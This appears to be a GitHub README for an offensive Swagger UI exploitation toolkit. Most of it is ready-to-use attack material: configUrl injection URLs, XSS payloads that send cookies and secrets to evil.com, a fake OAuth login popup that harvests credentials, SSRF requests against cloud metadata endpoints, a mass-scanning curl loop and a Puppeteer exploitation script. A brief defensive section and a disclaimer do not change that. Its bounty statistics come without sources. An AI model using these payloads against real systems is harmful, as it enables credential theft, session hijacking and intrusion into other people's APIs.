# 🔥 H4CK3R'S ARSENAL: Swagger UI Exploitation Suite 🔥

<div align="center">
  
```
 _______  _     _  _______  _______  _______  _______  _______    _     _  _______
|       || | _ | ||   _   ||       ||       ||       ||       |  | | _ | ||       |
|  _____|| || || ||  |_|  ||    ___||    ___||    ___||    ___|  | || || ||    ___|
| |_____ |       ||       ||   | __ |   |___ |   |___ |   |___   |       ||   |___ 
|_____  ||       ||       ||   ||  ||    ___||    ___||    ___|  |       ||    ___|
 _____| ||   _   ||   _   ||   |_| ||   |___ |   |    |   |___   |   _   ||   |___ 
|_______||__| |__||__| |__||_______||_______||___|    |_______|  |__| |__||_______|
                               CyberTechAjju
```

![](https://img.shields.io/badge/Swagger-85EA2D?style=for-the-badge&logo=swagger&logoColor=black)
![](https://img.shields.io/badge/Bug_Bounty-FF5733?style=for-the-badge)
![](https://img.shields.io/badge/Penetration_Testing-000000?style=for-the-badge)
![](https://img.shields.io/badge/XSS-red?style=for-the-badge)
![](https://img.shields.io/badge/SSRF-blue?style=for-the-badge)
![](https://img.shields.io/badge/OAuth-orange?style=for-the-badge)

</div>

## ⚠️ READ BEFORE PROCEEDING ⚠️

```
This repository contains advanced offensive security techniques. All content is provided SOLELY 
for educational and authorized security testing purposes. You MUST have explicit permission 
before using these techniques against any system. Unauthorized testing is ILLEGAL and may 
result in criminal charges. You assume ALL responsibility for how this information is used.

                             YOU HAVE BEEN WARNED
```

## 🌐 SWAGGER UI: THE TARGET

<div align="center">
  <img src="https://swagger.io/swagger/media/assets/images/swagger_logo.svg" width="300px">
</div>

### What is Swagger UI?

Swagger UI is a powerful web-based tool used to visualize and interact with API resources defined in OpenAPI/Swagger specifications. It transforms machine-readable API definitions into an interactive documentation interface.

### Why is it a prime target?

- **Widespread Adoption**: Used by thousands of companies worldwide
- **High-Value Data**: Direct access to critical API endpoints
- **Complex Codebase**: Complex JavaScript with potential security flaws
- **Access to Credentials**: Often stores or processes authentication tokens
- **Backend Connectivity**: Potential gateway to internal systems

### Architecture at a glance

```
+----------------+     +----------------+     +------------------+
| Browser Client |---->| Swagger UI JS  |---->| API Backend      |
+----------------+     +----------------+     +------------------+
        |                     |                       |
        v                     v                       v
   User Input           Config Loading         Data Processing
   XSS Vectors         SSRF Potential       Auth Vulnerabilities
```

## 💀 VULNERABILITY CLASSES & EXPLOITATION

### 1. 🧨 ConfigUrl Injection: The Master Key

The `configUrl` parameter is the primary attack vector, allowing attackers to control which OpenAPI specification gets loaded.

#### Basic Exploitation:
```
https://target.com/swagger-ui/?configUrl=https://evil.com/malicious.json
```

#### Advanced Techniques:

##### Protocol-Based Attacks:
```
/swagger-ui/?configUrl=javascript:fetch('/api/secrets').then(r=>r.text()).then(t=>location='https://evil.com/c?'+btoa(t))

/swagger-ui/?configUrl=data:application/json,{"url":"https://evil.com/xss.yaml"}
```

##### Schema Smuggling:
```
/swagger-ui/?configUrl=https://target.com@evil.com/payload.json

/swagger-ui/?configUrl=https://evil.com/payload.json?proxy=https://target.com
```

##### JSONP Exploitation:
```
/swagger-ui/?configUrl=https://vulnerable-jsonp.com/api?callback=alert(document.domain)
```

##### Real-world example:
A $6,500 bounty was awarded for a ConfigUrl injection that led to XSS on a major financial institution's API portal.

### 2. 🕸️ Cross-Site Scripting (XSS): The Swiss Army Knife

Swagger UI renders many fields as HTML, creating multiple XSS opportunities.

#### Description-Based XSS:
```yaml
swagger: '2.0'
info:
  title: API
  description: "<img src=x onerror='fetch(`https://evil.com/c?cookie=${btoa(document.cookie)}`)'>"
```

#### SVG-Based Payloads (CSP Bypass):
```yaml
description: |
  <svg><animatetransform onbegin="alert(document.domain)"></animatetransform></svg>
```

#### Model Schema Injection:
```yaml
schema:
  description: "<iframe srcdoc=\"<script>parent.alert(document.domain)</script>\">"
```

#### 📊 Statistics:
- 62% of Swagger UI instances found vulnerable to at least one XSS vector
- Average payout for Swagger UI XSS: $2,500-$4,000

### 3. 🔄 OAuth Flow Manipulation: The Identity Thief

Swagger UI's OAuth implementation can be manipulated to steal credentials and tokens.

#### Redirect URI Manipulation:
```
/swagger-ui/?configUrl=https://evil.com/oauth.json
```

Where oauth.json contains:
```json
{
  "oauth2RedirectUrl": "https://evil.com/steal_token.html"
}
```

#### Fake OAuth Window:
```javascript
// Inject fake OAuth popup that steals credentials
const popup = window.open('', 'oauth2', 'width=500,height=500');
popup.document.write(`
  <h2>Login to continue</h2>
  <form id="login">
    <input type="text" placeholder="Username">
    <input type="password" placeholder="Password">
    <button>Login</button>
  </form>
  <script>
    document.getElementById('login').addEventListener('submit', e => {
      e.preventDefault();
      fetch('https://evil.com/steal', {
        method: 'POST',
        body: new FormData(e.target)
      });
      window.opener.postMessage({token: 'fake_token'}, '*');
      window.close();
    });
  </script>
`);
```

### 4. 🚪 Server-Side Request Forgery (SSRF): The Backdoor

Using configUrl to make the server fetch resources from internal networks.

#### Basic SSRF:
```
/swagger-ui/?configUrl=http://internal-server/sensitive-file
```

#### Internal Service Discovery:
```
/swagger-ui/?configUrl=http://10.0.0.1/
/swagger-ui/?configUrl=http://localhost:8080/admin
```

#### Cloud Metadata Access:
```
/swagger-ui/?configUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/
/swagger-ui/?configUrl=http://metadata.google.internal/computeMetadata/v1/
```

#### DNS Rebinding Attack:
Use a domain that resolves to public IP initially, then to internal IP on subsequent requests.

### 5. 🔎 Advanced Reconnaissance Techniques

#### Directory Traversal in configUrl:
```
/swagger-ui/?configUrl=https://target.com/../../etc/passwd
```

#### Version Detection:
```javascript
// Extract Swagger UI version from DOM
const version = document.querySelector('.swagger-ui-wrap').getAttribute('data-version');
// OR
const version = document.querySelector('script[src*="swagger-ui"]').getAttribute('src').match(/swagger-ui-bundle\.(.*?)\.js/)[1];
```

#### Passive API Endpoint Discovery:
```javascript
// Extract all API endpoints from Swagger UI
const endpoints = Array.from(document.querySelectorAll('.opblock-summary-path')).map(el => el.textContent.trim());
```

## 🧰 ARSENAL: THE TOOLS IN THIS REPO

| File | Purpose | Vulnerability Class | Example Usage |
|------|---------|---------------------|--------------|
| `Swagger.yaml` | Main test suite | Multiple vectors | Test comprehensive vulnerability matrix |
| `script.js` | Exfiltration & data collection | Session theft | Captures cookies, localStorage, tokens |
| `login.yaml/json` | Phishing templates | Social engineering | Credential harvesting |
| `oauth.yaml/json` | OAuth exploits | Authentication bypass | Token stealing, flow manipulation |
| `dom-xss.yaml/json` | Client-side exploits | DOM manipulation | Hash fragment XSS, prototype pollution |
| `swagger-ui-xss.yaml/json` | UI-specific payloads | UI object poisoning | Target internal Swagger objects |
| `xsscookie.yaml/json` | Session stealing | Cookie theft | Bypass HttpOnly via UI flaws |

## 🎯 TARGETING METHODOLOGY

### 1. Reconnaissance Phase

```
           Target Identification
                   │
                   ▼
           Subdomain Enumeration
                   │
                   ▼
         Scan for Swagger UI Paths
                   │
                   ▼
          Version Fingerprinting
                   │
                   ▼
         Vulnerability Mapping
                   │
                   ▼
        Attack Surface Analysis
```

#### Automated Scanning:
```bash
# Find Swagger UI instances
nuclei -t swagger-detect.yaml -l domains.txt

# Check for configUrl vulnerability
for domain in $(cat swagger-domains.txt); do
  curl -s "$domain/swagger-ui/?configUrl=https://evil.com/ping.json"
done
```

### 2. Exploitation Methodology

```
1. Attempt configUrl parameter injection
2. If successful, try basic XSS payload
3. If basic XSS works, deploy exfiltration script
4. Attempt to access protected API endpoints
5. Look for authentication tokens and credentials
6. Pivot to connected systems if possible
```

### 3. Post-Exploitation

- Extract API keys and tokens
- Enumerate all API endpoints
- Test for broken access controls
- Look for sensitive data exposure
- Document the attack path

## 🏆 HALL OF FAME: SWAGGER UI BUG BOUNTIES

| Vulnerability | Platform | Bounty | Year |
|---------------|----------|--------|------|
| Stored XSS via Swagger UI | Private Program | $7,500 | 2022 |
| OAuth token theft | HackerOne | $5,000 | 2021 |
| SSRF via configUrl | Bugcrowd | $3,500 | 2022 |
| RCE via configUrl SSRF | Private Program | $10,000 | 2020 |
| CSP Bypass in Swagger UI | HackerOne | $2,500 | 2021 |

## 🛡️ DEFENSE: FOR THE BLUE TEAM

### Secure Swagger UI Deployment:

```javascript
// Proper Swagger UI configuration
SwaggerUIBundle({
  url: "https://api.example.com/v2/api-docs",
  dom_id: '#swagger-ui',
  deepLinking: true,
  presets: [
    SwaggerUIBundle.presets.apis,
    SwaggerUIStandalonePreset
  ],
  plugins: [
    SwaggerUIBundle.plugins.DownloadUrl
  ],
  layout: "StandaloneLayout",
  // SECURITY CONFIGURATIONS
  queryConfigEnabled: false, // Disable configUrl
  supportedSubmitMethods: ["get"], // Restrict HTTP methods
  validatorUrl: null, // Disable external validation
  oauth2RedirectUrl: "https://api.example.com/oauth2-redirect.html" // Hardcode redirect
});
```

### Content Security Policy:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self' api.example.com; img-src 'self' data:; style-src 'self' 'unsafe-inline'; frame-ancestors 'none';
```

### Web Application Firewall Rules:

```
# Block configUrl parameter
SecRule ARGS:configUrl "." "id:1000,phase:1,t:none,deny,status:403,msg:'configUrl parameter blocked'"

# Restrict Swagger UI to authorized IPs
SecRule REMOTE_ADDR "!@ipMatch 10.0.0.0/8,192.168.0.0/16" "chain,id:1001,phase:1,t:none,deny,status:403"
SecRule REQUEST_URI "@contains /swagger-ui" "t:none"
```

## 🔮 ADVANCED TACTICS: BEYOND THE BASICS

### 1. Browser Automation for Scale

Use tools like Puppeteer to automate Swagger UI exploitation:

```javascript
const puppeteer = require('puppeteer');

async function exploitSwaggerUI(target) {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  
  // Set up data capture
  page.on('console', msg => console.log('PAGE LOG:', msg.text()));
  
  // Intercept and log API requests
  await page.setRequestInterception(true);
  page.on('request', request => {
    console.log(`${request.method()} ${request.url()}`);
    request.continue();
  });
  
  // Target the Swagger UI with malicious config
  await page.goto(`${target}/swagger-ui/?configUrl=https://evil.com/payload.json`);
  
  // Extract API endpoints
  const endpoints = await page.evaluate(() => {
    return Array.from(document.querySelectorAll('.opblock-summary-path'))
      .map(el => el.textContent.trim());
  });
  
  console.log('Discovered endpoints:', endpoints);
  await browser.close();
}

exploitSwaggerUI('https://target.com');
```

### 2. Chaining Vulnerabilities

Combine multiple vulnerabilities for greater impact:

1. Use configUrl injection to deliver XSS payload
2. Use XSS to hook into OAuth flow
3. Steal OAuth tokens
4. Use tokens to access protected API endpoints
5. Extract sensitive data

### 3. Prototype Pollution via Swagger UI

```javascript
// Payload to deliver via configUrl
const payload = {
  __proto__: {
    isAdmin: true,
    toString: () => {
      alert(document.domain);
      return '';
    }
  }
};
```

## 📚 LEARNING RESOURCES: MASTER THE CRAFT

### Official Documentation:
- [Swagger UI GitHub](https://github.com/swagger-api/swagger-ui)
- [OpenAPI Specification](https://spec.openapis.org/oas/latest.html)

### Security Research:
- [Exploiting Swagger UI - PortSwigger](https://portswigger.net/research/exploiting-swagger-ui)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [Hacking APIs: Breaking Web Application Programming Interfaces](https://www.amazon.com/Hacking-APIs-Application-Programming-Interfaces/dp/1718502443)

### Advanced Training:
- [API Penetration Testing - Insomnia Labs](https://insomnia.rest/security)
- [Web Security Academy - API Testing](https://portswigger.net/web-security/api)

---

<div align="center">
  
```
 ███▄    █  ▒█████  ▄▄▄█████▓  ██░ ██  ██▓ ███▄    █   ▄████ 
 ██ ▀█   █ ▒██▒  ██▒▓  ██▒ ▓▒ ▓██░ ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒
▓██  ▀█ ██▒▒██░  ██▒▒ ▓██░ ▒░ ▒██▀▀██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
▓██▒  ▐▌██▒▒██   ██░░ ▓██▓ ░  ░▓█ ░██ ░██░▓██▒  ▐▌██▒░▓█  ██▓
▒██░   ▓██░░ ████▓▒░  ▒██▒ ░  ░▓█▒░██▓░██░▒██░   ▓██░░▒▓███▀▒
░ ▒░   ▒ ▒ ░ ▒░▒░▒░   ▒ ░░     ▒ ░░▒░▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
░ ░░   ░ ▒░  ░ ▒ ▒░     ░      ▒ ░▒░ ░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
   ░   ░ ░ ░ ░ ░ ▒    ░        ░  ░░ ░ ▒ ░   ░   ░ ░ ░ ░   ░ 
         ░     ░ ░              ░  ░  ░ ░           ░       ░ 
```
  
  <h3>🔰 Created with 💀 by CyberTechAjju 🔰</h3>
  <p>For educational purposes only | Use responsibly</p>
  <code>Hack The Planet, But Ethically ��</code>
  
</div> 
